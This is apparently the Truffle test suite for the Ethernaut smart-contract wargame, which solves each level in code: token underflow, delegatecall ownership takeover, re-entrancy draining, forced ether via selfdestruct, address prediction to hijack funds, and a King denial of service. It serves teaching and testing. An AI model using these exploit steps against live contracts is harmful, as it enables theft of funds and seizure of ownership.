/*eslint no-undef: "off"*/
const Ethernaut = artifacts.require('./Ethernaut.sol')

const DelegationFactory = artifacts.require('./levels/DelegationFactory.sol')
const Delegation = artifacts.require('./levels/Delegation.sol')

const TokenFactory = artifacts.require('./levels/TokenFactory.sol')
const Token = artifacts.require('./levels/Token.sol')

const Reentrance = artifacts.require('./levels/Reentrance.sol')
const ReentranceFactory = artifacts.require('./levels/ReentranceFactory.sol')
const ReentranceAttack = artifacts.require('./attacks/ReentranceAttack.sol')

const ForceFactory = artifacts.require('./levels/ForceFactory.sol')
const ForceAttack = artifacts.require('./attacks/ForceAttack.sol')
const Force = artifacts.require('./levels/Force.sol')

const ElevatorFactory = artifacts.require('./levels/ElevatorFactory.sol')
const ElevatorAttack = artifacts.require('./attacks/ElevatorAttack.sol')
const Elevator = artifacts.require('./levels/Elevator.sol')

const InstanceFactory = artifacts.require('./levels/InstanceFactory.sol')
const Instance = artifacts.require('./levels/Instance.sol')

const FallbackFactory = artifacts.require('./levels/FallbackFactory.sol')
const Fallback = artifacts.require('./levels/Fallback.sol')

const FalloutFactory = artifacts.require('./levels/FalloutFactory.sol')
const Fallout = artifacts.require('./levels/Fallout.sol')

const HiJackFactory = artifacts.require('./levels/HiJackFactory.sol')
const HiJack = artifacts.require('./levels/HiJack.sol')
const HiJackSimpleToken = artifacts.require('./levels/HiJackSimpleToken.sol')

const KingFactory = artifacts.require('./levels/KingFactory.sol')
const King = artifacts.require('./levels/King.sol')
const KingAttack = artifacts.require('./attacks/KingAttack.sol')

import * as utils from './utils/TestUtils'
import expectThrow from 'zeppelin-solidity/test/helpers/expectThrow'
import toPromise from 'zeppelin-solidity/test/helpers/toPromise'

let rlp = require('rlp')
let sha3 = require('sha3')

contract('Ethernaut', function(accounts) {

  let ethernaut
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
  });

  // ----------------------------------
  // Token
  // ----------------------------------

  describe('Token', function() {

    let level

    before(async function() {
      level = await TokenFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Token);

      // Check init balances
      let balance = (await instance.balanceOf(player)).toNumber();
      console.log(`init player balance: ${balance}`)
      assert.equal(balance, 20)
      const supply = (await instance.totalSupply.call()).toNumber();
      console.log(`token supply: ${supply}`)
      assert.equal(supply, 21000000)

      // Check transfer
      await instance.transfer(accounts[2], 1, {from: player})
      balance = (await instance.balanceOf(player)).toNumber();
      console.log(`player balance: ${balance}`)
      assert.equal(balance, 19)

      // Overflow
      await instance.transfer(accounts[2], 20, {from: player})
      balance = (await instance.balanceOf(player)).toNumber();
      console.log(`player balance: ${balance}`)
      assert.equal(balance, 1.157920892373162e+77)

      // Check win.
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });

  // ----------------------------------
  // Delegation
  // ----------------------------------

  describe('Delegation', function() {

    let level

    before(async function() {
      level = await DelegationFactory.new()
      await ethernaut.registerLevel(level.address)

    })

    it('should allow the player to solve the level', async function() {

      // Get instance, which should be owned by the level
      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Delegation);
      console.log(`player:`, player)
      console.log(`factory:`, level.address)
      let owner = await instance.owner.call()
      console.log(`instance owner:`, level.address)
      assert.equal(owner, level.address)

      // Use the fallback method to call the delegate's pwn()
      const pwner = web3.sha3("pwn()").substring(0, 10)
      await web3.eth.sendTransaction({
        from: player,
        to: instance.address,
        data: pwner
      }, (err, res) => {})

      // Player should own the instance now
      owner = await instance.owner.call()
      console.log(`new instance owner:`, owner)
      assert.equal(owner, player)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });
  });

  // ----------------------------------
  // Force
  // ----------------------------------

  describe('Force', function() {

    let level

    before(async function() {
      level = await ForceFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Force);

      // Check init balances
      let balance = await utils.getBalance(web3, instance.address)
      console.log(`init instance balance: ${balance}`)
      assert.equal(balance, 0)

      // Sending funds should not work
      await web3.eth.sendTransaction({
        from: player,
        to: instance.address,
        value: web3.toWei(0.01, 'ether')
      }, async function() {

        balance = await utils.getBalance(web3, instance.address)
        console.log(`instance balance: ${balance}`)
        assert.equal(balance, 0)

        // Attack
        const attacker = await ForceAttack.new({
          from: player,
          value: web3.toWei(0.01, 'ether')
        })
        await attacker.attack(instance.address)

        // Check init balances
        balance = await utils.getBalance(web3, instance.address)
        console.log(`post instance balance: ${balance}`)
        assert.notEqual(balance, 0)

        // Check win.
        const ethCompleted = await utils.submitLevelInstance(
          ethernaut,
          level.address,
          instance.address,
          player
        )
        assert.equal(ethCompleted, true)

      })
    });
  });

  // ----------------------------------
  // Elevator
  // ----------------------------------

  describe('Elevator', function() {

    let level

    before(async function() {
      level = await ElevatorFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {
      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Elevator);

      // check init state
      assert.isFalse(await instance.top())

      // Attack
      const attacker = await ElevatorAttack.new()

      let res = await attacker.attack(instance.address)

      console.log("***********************************************")
      console.log(res)
      console.log("***********************************************")

      // Check win.
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )

      assert.equal(ethCompleted, true)
    });
  });

  // ----------------------------------
  // Re-entrancy
  // ----------------------------------

  describe('Re-entrancy', function() {

    let level

    before(async function() {
      level = await ReentranceFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const insertCoin = web3.fromWei(
        (await level.insertCoin.call()).toNumber(), 'ether'
      )
      console.log(`level insertCoin:`, insertCoin)

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Reentrance,
        {from: player, value: web3.toWei(insertCoin, 'ether')}
      )

      // Query contract balance (should be 0.1)
      let instanceBalance = await utils.getBalance(web3, instance.address)
      console.log(`init instance balance:`, instanceBalance)
      assert.equal(instanceBalance, insertCoin)

      // Deploy attacker contract
      const attackerFunds = 0.01
      const attacker = await ReentranceAttack.new(instance.address, {
        value: web3.toWei(attackerFunds, 'ether')
      })

      // Check attacker balance
      let attackerBalance = await utils.getBalance(web3, attacker.address)
      console.log(`init attacker balance:`, attackerBalance)
      assert.equal(attackerBalance, attackerFunds)

      // '(◣_◢)'
      await attacker.attack_1_causeOverflow()
      attackerBalance = await utils.getBalance(web3, attacker.address)
      console.log(`post attacker balance 1:`, attackerBalance)
      await attacker.attack_2_deplete()
      attackerBalance = await utils.getBalance(web3, attacker.address)
      console.log(`post attacker balance 2:`, attackerBalance)

      // Query balance
      instanceBalance = await utils.getBalance(web3, instance.address)
      console.log(`post instance balance:`, instanceBalance)
      assert.equal(instanceBalance, 0)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });

  // ----------------------------------
  // Instance
  // ----------------------------------

  describe('Instance', function() {

    let level

    before(async function() {
      level = await InstanceFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Instance,
        {from: player}
      )

      const password = await instance.password.call()
      await instance.authenticate(password)
      const clear = await instance.getCleared()
      assert.equal(clear, true)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });

  // ----------------------------------
  // Fallback
  // ----------------------------------

  describe('Fallback', function() {

    let level

    before(async function() {
      level = await FallbackFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Fallback,
        {from: player}
      )

      assert.equal(await instance.owner(), level.address)
      assert.equal(web3.toWei(1000, 'ether'), (await instance.getContribution({from: level.address})).toNumber())

      await instance.contribute({from: player, value: web3.toWei(0.0001, 'ether')})
      assert.notEqual(0, (await instance.getContribution({from: player})).toNumber())
      assert.notEqual(0, await utils.getBalance(web3, instance.address))

      web3.eth.sendTransaction({from: player, to: instance.address, value: web3.toWei(0.001, 'ether')}, async function(err, res) {
        assert.equal(player, await instance.owner())

        await instance.withdraw({from: player})
        assert.equal(0, await utils.getBalance(web3, instance.address))

        // Factory check
        const ethCompleted = await utils.submitLevelInstance(
          ethernaut,
          level.address,
          instance.address,
          player
        )
        assert.equal(ethCompleted, true)
      })
    });
  });

  // ----------------------------------
  // Fallout
  // ----------------------------------

  describe('Fallout', function() {

    let level

    before(async function() {
      level = await FalloutFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function() {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, Fallout,
        {from: player}
      )

      assert.equal(await instance.owner(), level.address)

      await instance.Fal1out()
      assert.equal(await instance.owner(), player)

      // Factory check
      const ethCompleted = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      assert.equal(ethCompleted, true)
    });
  });

  // ----------------------------------
  // HiJack
  // ----------------------------------

  describe('HiJack', function() {

    let level

    before(async function () {
      level = await HiJackFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function () {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, HiJack,
        {from: player, value: web3.toWei(1, 'ether')}
      )
   
      // A function to calculate generated addresses.
      let targetAddress = function(instanceAddress,nonce) {
          let bufferAddress = Buffer.from(instanceAddress.slice(2),'hex');
          let data = rlp.encode([bufferAddress,nonce])
          let d = new sha3.SHA3Hash(256);
          d.update(data);
          return '0x' + d.digest('hex').slice(24);
      }
      // Init checks
      let instanceAddress = await instance.address;  

      assert.equal(await instance.address1.call(), targetAddress(instanceAddress,2))
      assert.equal(await instance.address2.call(), targetAddress(instanceAddress,4))
      assert.equal(await instance.owner.call(), level.address)
      console.log('address1:', await instance.address1.call())
      console.log('address2:', await instance.address2.call())

      // Ensure that players can create a token
      console.log('creating a new token...')
      await instance.generateToken("test", 50);
      // Check the created contract address is as expected
      let testTokenAddress = targetAddress(instanceAddress,1);
      let testInstance = await HiJackSimpleToken.at(testTokenAddress);
      assert.equal(await testInstance.name.call(), "test");
      assert.equal(await testInstance.owner.call(), player);

      // Factory check (should fail)
      // NOTE: Factory check makes the level become the king,
      //       player wins when the factory is not able to do this.
      console.log('Check complete (should fail)...')
      let completed = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      console.log('completed:', completed)
      assert.equal(completed, false)

      // Attack
      // We simply need to create a few more tokens and call suicide from one of them. 
      console.log('Performing attack');
      // This will be associated with the first target address
      await instance.generateToken("First Target Contract Token", 500);
      await instance.generateToken("pointless token", 0);
      // This will be associated with the second target address
      await instance.generateToken("Second Target Contract Token", 500);

      // Lets claim the ether from all the target addresses. 
      let address1 = await HiJackSimpleToken.at(targetAddress(instanceAddress,2));
      let address2 = await HiJackSimpleToken.at(targetAddress(instanceAddress,4));

      console.log('Suiciding all target addresses');
      // Suicide them all
      await address1.destroy();
      await address2.destroy();

      // Factory check (should pass)
      console.log('Check complete (should pass)...')
      completed = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      console.log('completed:', completed)
      assert.equal(completed, true)

    });

  });
  // ----------------------------------
  // King
  // ----------------------------------

  describe('King', function() {

    let level

    before(async function () {
      level = await KingFactory.new()
      await ethernaut.registerLevel(level.address)
    })

    it('should allow the player to solve the level', async function () {

      const instance = await utils.createLevelInstance(
        ethernaut, level.address, player, King,
        {from: player, value: web3.toWei(1, 'ether')}
      )

      // Init checks
      assert.equal(await instance.king(), level.address)
      assert.equal(web3.fromWei(await instance.prize()).toNumber(), 1)
      console.log('king:', await instance.king())
      console.log('prize:', web3.fromWei(await instance.prize()).toNumber())

      // Ensure that players can become king
      console.log('new king...')
      await toPromise(web3.eth.sendTransaction)({
        from: accounts[1],
        to: instance.address,
        value: web3.toWei(2, 'ether')
      })
      console.log('king:', await instance.king());
      console.log('prize:', web3.fromWei(await instance.prize()).toNumber())
      assert.equal(web3.fromWei(await instance.prize()).toNumber(), 2)
      assert.equal(await instance.king(), accounts[1])

      // Ensure that players dont become king if they dont meet the prize
      console.log('failed claim...')
      await expectThrow(
        toPromise(web3.eth.sendTransaction)({
          from: accounts[2],
          to: instance.address,
          value: web3.toWei(0.1, 'ether')
        })
      )
      console.log('king:', await instance.king());
      console.log('prize:', web3.fromWei(await instance.prize()).toNumber())
      assert.equal(web3.fromWei(await instance.prize()).toNumber(), 2)
      assert.equal(await instance.king(), accounts[1])

      // Factory check (should fail)
      // NOTE: Factory check makes the level become the king,
      //       player wins when the factory is not able to do this.
      console.log('Check complete (should fail)...')
      let completed = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      console.log('completed:', completed)
      assert.equal(completed, false)

      // Attack
      const attackerFunds = 2.01
      const attacker = await KingAttack.new();
      await attacker.doYourThing(instance.address, {
        value: web3.toWei(attackerFunds, 'ether')
      })

      // Factory check (should pass)
      console.log('Check complete (should pass)...')
      completed = await utils.submitLevelInstance(
        ethernaut,
        level.address,
        instance.address,
        player
      )
      console.log('completed:', completed)
      assert.equal(completed, true)

    });

  });

});
